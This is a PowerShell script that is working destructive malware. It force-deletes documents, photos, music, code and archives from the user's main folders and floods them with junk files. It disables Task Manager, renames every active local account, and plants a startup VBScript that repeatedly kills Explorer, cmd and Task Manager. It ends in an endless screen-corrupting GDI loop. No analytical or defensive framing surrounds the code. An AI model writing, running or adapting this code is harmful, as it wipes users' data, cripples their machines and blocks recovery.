$desktopPath = [Environment]::GetFolderPath("Desktop")
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$musicPath = [Environment]::GetFolderPath("MyMusic")
$picturesPath = [Environment]::GetFolderPath("MyPictures")
$videosPath = [Environment]::GetFolderPath("MyVideos")

$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")

$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)

foreach ($path in $pathsToDelete) {
    foreach ($extension in $extensionsToDelete) {
        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File

        foreach ($file in $filesToDelete) {
            $filePath = $file.FullName
            Write-Host "Deleting file: $filePath"
            Remove-Item -Path $filePath -Force
        }
    }

    for ($i = 1; $i -le 999; $i++) {
        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
        $newFileName = ".....⓿⌓⓿....._$randomIteration.txt"
        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
    }
}

# Create registry key to disable Task Manager
$disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
New-Item -Path $disableTaskMgrPath -Force | Out-Null
Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1

# Create registry key to disable Search Bar in taskbar
$searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
New-Item -Path $searchBarPath -Force | Out-Null
Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0

# Change the user account names
$users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
foreach ($user in $users) {
    $newName = "⓿⌓⓿"
    Rename-LocalUser -Name $user.Name -NewName $newName
}


# Create VBScript file
$vbsScript = @"
Set WshShell = WScript.CreateObject("WScript.Shell")
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

'Add script to Startup folder
strStartupPath = WshShell.SpecialFolders("Startup")
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

'Check if Task Manager is running, and if so, close it
Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
If colProcessList.Count > 0 Then
    For Each objProcess In colProcessList
        objProcess.Terminate()
    Next
End If

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 0 'wait for window to activate before closing
                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
            Next
        End If
    Next
    
    'Type "n" into search bar with focus
    WshShell.SendKeys "n"
    
    WScript.Sleep 0 'wait before checking again
Loop
"@

# Save the VBScript file to the desktop
$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "CloseWindows.vbs")
$vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII

# Run the VBScript file
$WshShell = New-Object -ComObject WScript.Shell
$WshShell.Run($vbsFilePath)

# Set wallpaper and update system parameters
$objShell = New-Object -ComObject WScript.Shell
$objShell.RegWrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ")
$objShell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, $true)

$source = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class Win32
{
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int smIndex);

    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool SetProcessDPIAware();

    [DllImport("gdi32.dll")]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("gdi32.dll")]
    static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);

    public static void ReversePIP()
    {
        SetProcessDPIAware();
        int cx = GetSystemMetrics(0);
        int cy = GetSystemMetrics(1);

        while (true)
        {
            Thread.Sleep(800);
            IntPtr hdc = GetDC(IntPtr.Zero);

            // StretchBlt for Reverse PIP
            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);

            // BitBlt for Inverting Colors
            //BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);

            // TransparentBlt for Transparency
            //TransparentBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, cx, cy, 0xFF0000);

            // BitBlt with Raster Operation (ROP) Code for XOR Effect
            BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00660046);
        }
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp
[Win32]::ReversePIP()
